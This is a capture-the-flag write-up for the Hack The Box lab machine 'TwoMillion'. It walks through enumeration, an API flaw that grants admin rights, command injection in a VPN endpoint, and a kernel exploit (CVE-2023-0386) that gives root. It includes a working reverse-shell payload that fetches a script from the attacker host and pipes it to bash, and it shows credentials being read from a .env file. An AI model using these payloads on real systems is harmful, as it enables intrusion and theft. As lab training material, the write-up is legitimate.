---
name: TwoMillion
difficulty: easy
os: linux
platform: htb
date: 2025/08/29
releasedDate: 2009-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.221 -o allPorts
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We can see that port 22 is open, which is the SSH service and port 80 is open, which is the HTTP service.

We will add a DNS resolution step to resolve the hostname `2million.htb` to its corresponding IP address.

```bash
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p22,80 -sCV 10.10.11.221 -o targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
```

We try logging in with usernames in hall of fame: filippos, stefano118, alamot, arkantolo, KNX, ahmed, scorpion, eks, zc00l, n0decaf

```bash
ffuf -u http://2million.htb/api/v1/user/login \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "email=FUZZ@2million.htb&password=admin" \
     -w users \
     -fc 302
```

```
:: Progress: [10/10] :: Job [1/1] :: 1250 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

None of them worked.

We check `this` property in `/invite` web page:

```javascript
this;
```

```
Window http://2million.htb/invite#
​
"$"
cancelRequestAnimFrameclamp
hexToRgb
isInArray
jQuery
jQuery220025084560406000881makeInviteCode
​​arguments
​​caller
​​length
​​name
​​prototype
​​<prototype>pJS
pJSDomparticlesJS
requestAnimFrameverifyInviteCode
<default properties><prototype>
```


## User Exploitation


```javascript
this.makeInviteCode();
```

```json
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

We use `https://gchq.github.io/CyberChef/` to decode the message using ROT13

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

We use `curl` to make the POST request with the necessary data.

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate \
     | awk -F: '{print $5}' \
     | awk -F'",' '{print $1}' \
     | tr -d '"' \
     | base64 -d
```

```
9O3XD-DNCP7-ADY40-RH67J
```

Now, we are able to register using the invite code `9O3XD-DNCP7-ADY40-RH67J`.

We find out there are `/api/v1/user/vpn/generate`, `/api/v1/user/vpn/regenerate`, so we will try to fetch `/api/v1/`:

```bash
curl -s http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' | jq
```

```json
{
    "v1": {
        "user": {
            "GET": {
                "/api/v1": "Route List",
                "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate": "Generate invite code",
                "/api/v1/invite/verify": "Verify invite code",
                "/api/v1/user/auth": "Check if user is authenticated",
                "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                "/api/v1/user/vpn/download": "Download OVPN file"
            },
            "POST": {
                "/api/v1/user/register": "Register a new user",
                "/api/v1/user/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "/api/v1/admin/auth": "Check if user is admin"
            },
            "POST": {
                "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "/api/v1/admin/settings/update": "Update user settings"
            }
        }
    }
}
```

We try to generate a admin VPN for ourselfs:

```bash
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc'
| jq
```
```
401 Unauthorized
```

We check if our user is admin:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' | jq
```

```json
{
    "message": false
}
```

We try to update our user settings:

```bash
curl -sX PUT http://2million.htb/api/v1/admin/settings/update \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' \
     -H 'Content-Type: application/json' \
     -d '{"email":"test@test.com","is_admin":1}' | jq
```
```json
{
  "id": 13,
  "username": "test",
  "is_admin": 1
}
```

We check again if our user is admin:

```bash
curl -s http://2million.htb/api/v1/admin/auth \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' | jq
```

```json
{
    "message": true
}
```

We try to generate a admin VPN for ourselfs:

```bash
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' \
     -H 'Content-Type: application/json' \
     -d '{"username": "test"}'
```
```
...
vpn file ...
...
```

We try to inject a command in username field:

```bash
curl -sX POST http://2million.htb/api/v1/admin/vpn/generate \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' \
     -H 'Content-Type: application/json' \
     -d '{"username": "; sleep 2"}'
```
In this case, the response time is 2 seconds, so we can confirm that there is a command injection vulnerability.

We set up a reverse shell payload to exploit this vulnerability.
```bash
echo "#!/bin/bash
bash -c \"sh -i >& /dev/tcp/10.10.14.190/443 0>&1\"" > reverse.sh
nc -lvnp 443
python3 -m http.server 80

curl -sX POST http://2million.htb/api/v1/admin/vpn/generate \
     -H 'Cookie: PHPSESSID=95l2jmh73n84bjsl9ogmnvgefc' \
     -H 'Content-Type: application/json' \
     -d '{"username": "; curl http://10.10.14.190/reverse.sh | bash"}'

whoami
```
```
www-data
```

We find a `.env` file in `/var/www/html/`:

```bash
cat /var/www/html/.env
```
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

We use `admin:SuperDuperPass123` to log in as the admin user.
```bash
ssh admin@2million.htb
whoami
```
```
admin
```

We can check the user flag:

```bash
cat /home/admin/user.txt
```
```
user flag value
```

## Root Exploitation

Once, we log in as user `admin`, we see this user has unread mail messages in the mail directory.
```bash
cat /var/mail/admin 
```
```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're 
partially down, can you also upgrade the OS on our web host? There have been a 
few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE 
looks nasty. We can't get popped by that.

HTB Godfather
```

We look up for any `OverlayFS / FUSE` CVE and we find `CVE-2023-0386`.

We can exploit this vulnerability to gain root access using this [github repository](https://github.com/puckiestyle/CVE-2023-0386).

We follow the instructions in the repository to compile, run the exploit and gain root access.

```bash
whoami
```
```
root
```

Finally we can get the root flag.

```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion

In this write-up, we have demonstrated the process of exploiting a command injection vulnerability in a web application to gain unauthorized access. By leveraging this vulnerability, we were able to escalate our privileges from a regular user to an admin user, and ultimately gain root access to the system. This highlights the importance of proper input validation and security measures in web applications to prevent such attacks.
